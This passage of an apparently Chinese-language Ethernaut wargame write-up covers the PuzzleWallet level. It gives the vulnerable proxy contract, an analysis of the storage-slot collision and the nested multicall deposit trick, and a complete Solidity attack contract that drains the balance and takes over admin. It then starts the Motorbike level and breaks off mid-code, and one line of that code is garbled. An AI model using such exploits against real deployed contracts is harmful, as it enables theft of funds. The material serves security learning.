punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> to<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> value<span class="token punctuation">&#125;</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Execution failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">multicall</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">calldata</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        <span class="token builtin">bool</span> depositCalled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>            <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _data <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>            <span class="token builtin">bytes4</span> selector<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>            <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>                selector <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>_data<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>selector <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deposit<span class="token punctuation">.</span>selector<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>                <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>depositCalled<span class="token punctuation">,</span> <span class="token string">"Deposit can only be called once"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>                <span class="token comment">// Protect against reusing msg.value</span></pre></td></tr><tr><td data-num="86"></td><td><pre>                depositCalled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>            <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>            <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Error while delegating call"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Analyse<br>本题要求成为 admin。<br>本题涉及代理合约的知识，简单来说代理合约通过 delegatecall 来转发逻辑合约的数据。</p><p>address public pendingAdmin;<br>address public admin;<br>与</p><p>address public owner;<br>uint256 public maxBalance;<br>对应 slot。admin 可以对合约进行升级，proposeAdmin (Address) 可以创建管理员，但是只有当前的管理员可以授权新的管理员。<br>分析逻辑合约与代理合约：<br>对于代理合约来说，approveNewAdmin 可以更新 admin，但是要想更新需要满足 onlyAdmin 限制，即 admin == msg.sender。除此之外就没有能更改 admin 的了。<br>接着看逻辑合约：<br>由于是 delegatecall 调用，所以 admin 对应 maxBalance。要想更改，setMaxBalance 函数需要满足白名单，而加入白名单需要，addToWhitelist 函数满足 msg.sender == owner。对于 owner 则可以通过更改 pendingAdmin，调用 proposeNewAdmin 函数即可。接下来只须满足 address (this).balance==0，而要想满足该条件，则要 execute 函数。但是其又需要满足 balances [msg.sender] &gt;= value, 然而本题初始时就设置了 balance 为 0.001ether，而 balances 的值有需要我们通过 deposit 函数存入。<br>所以我们无法清除初始的 0.001ether，然后我们分析 multicall 函数。</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">multicall</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">calldata</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token builtin">bool</span> depositCalled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _data <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token builtin">bytes4</span> selector<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                selector <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>_data<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>selector <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deposit<span class="token punctuation">.</span>selector<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>                <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>depositCalled<span class="token punctuation">,</span> <span class="token string">"Deposit can only be called once"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                <span class="token comment">// Protect against reusing msg.value</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                depositCalled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Error while delegating call"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>发现其是一个可以实现多个函数调用的函数，而调用的方法是 delegatecall，同时使用函数选择器来阻止 deposit 的多次调用。这就给了我们可乘之机，通过 msg.value 在一次交易中只能传递一次，且只要我们在 multicall 函数中调用 deposit 和 multicall (deposit)，此时函数选择器则无法排除 multicall (deposit)，且 depositCalled 会更新，<br>这时我们就实现了一次转账，但是 deposit 却记录两次。由于我们实际上只发送了 0.001 ether，因此合约实际的余额 balanace 为 0.002 ether，此时 balances [player] 和合约余额数值相等，因此再执行一次 execute 全部提款即可。然后设置 maxBalance。<br>最后我们设置一个自毁函数 selfdestruct (payable (msg.sender))，可以将我们使用的 ether 转给我们，因此只需要在部署的时候设置为 1ether 就行。</p><p>Attack</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">interface</span> <span class="token class-name">IPuzzle</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">proposeNewAdmin</span><span class="token punctuation">(</span><span class="token builtin">address</span> _newAdmin<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">addToWhitelist</span><span class="token punctuation">(</span><span class="token builtin">address</span> addr<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">multicall</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">calldata</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> _data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setMaxBalance</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _maxBalance<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Hack</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre> </pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span>IPuzzle  puzzle<span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token builtin">address</span> addresContract <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token comment">// 1. Propose a new admin</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        puzzle<span class="token punctuation">.</span><span class="token function">proposeNewAdmin</span><span class="token punctuation">(</span>addresContract<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token comment">// 2. Add the attacker to the whitelist</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        puzzle<span class="token punctuation">.</span><span class="token function">addToWhitelist</span><span class="token punctuation">(</span>addresContract<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token comment">// 3. Prepare the multicall payload</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> deposit_data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        deposit_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSelector</span><span class="token punctuation">(</span>puzzle<span class="token punctuation">.</span>deposit<span class="token punctuation">.</span>selector<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> deposit_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSelector</span><span class="token punctuation">(</span>puzzle<span class="token punctuation">.</span>multicall<span class="token punctuation">.</span>selector<span class="token punctuation">,</span> deposit_data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token comment">// 4. Execute the multicall with a deposit</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        puzzle<span class="token punctuation">.</span>multicall<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> <span class="token number">0.001</span> ether<span class="token punctuation">&#125;</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token comment">// 5. Execute the function to drain the contract's balance</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        puzzle<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token number">0.002</span> ether<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token comment">// 6. Set the max balance to the attacker's address</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        puzzle<span class="token punctuation">.</span><span class="token function">setMaxBalance</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token comment">// 7. Selfdestruct to send remaining funds to the attacker</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token comment">// Fallback function to receive Ether</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="motorbike"><a class="anchor" href="#motorbike">#</a> Motorbike</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">&lt;</span><span class="token version number">0.7.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-06/utils/Address.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-06/proxy/Initializable.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Motorbike</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">bytes32</span> <span class="token keyword">internal</span> <span class="token keyword">constant</span> _IMPLEMENTATION_SLOT <span class="token operator">=</span> <span class="token number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">AddressSlot</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token builtin">address</span> value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _logic<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>Address<span class="token punctuation">.</span><span class="token function">isContract</span><span class="token punctuation">(</span>_logic<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC1967: new implementation is not a contract"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token function">_getAddressSlot</span><span class="token punctuation">(</span>_IMPLEMENTATION_SLOT<span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> _logic<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> _logic<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"initialize()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Call failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token comment">// Delegates the current call to `implementation`.</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_delegate</span><span class="token punctuation">(</span><span class="token builtin">address</span> implementation<span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token comment">// solhint-disable-next-line no-inline-assembly</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token function">calldatacopy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">calldatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">let</span> result <span class="token operator">:=</span> <span class="token function">delegatecall</span><span class="token punctuation">(</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> implementation<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">calldatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token function">returndatacopy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">returndatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">switch</span> result</pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token keyword">case</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span> <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">returndatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">default</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">returndatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token comment">// Fallback function that delegates calls to the address returned by `_implementation()`.</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token comment">// Will run if no other function in the contract matches the call data</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> virtual <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token function">_delegate</span><span class="token punctuation">(</span><span class="token function">_getAddressSlot</span><span class="token punctuation">(</span>_IMPLEMENTATION_SLOT<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token comment">// Returns an `AddressSlot` with member `value` located at `slot`.</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_getAddressSlot</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> slot<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span>AddressSlot <span class="token keyword">storage</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>            r_slot <span class="token operator">:=</span> slot</pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Engine</span> <span class="token keyword">is</span> Initializable <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token comment">// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token builtin">bytes32</span> <span class="token keyword">internal</span> <span class="token keyword">constant</span> _IMPLEMENTATION_SLOT <span class="token operator">=</span> <span class="token number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> upgrader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> horsePower<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">AddressSlot</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token builtin">address</span> value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> initializer <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        horsePower <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        upgrader <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token comment">// Upgrade the implementation of the proxy to `newImplementation`</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token comment">// subsequently execute the function call</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token builtin">address</span> newImplementation<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> datupgradeToAndCalla<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>        <span class="token function">_authorizeUpgrade</span><span class="token 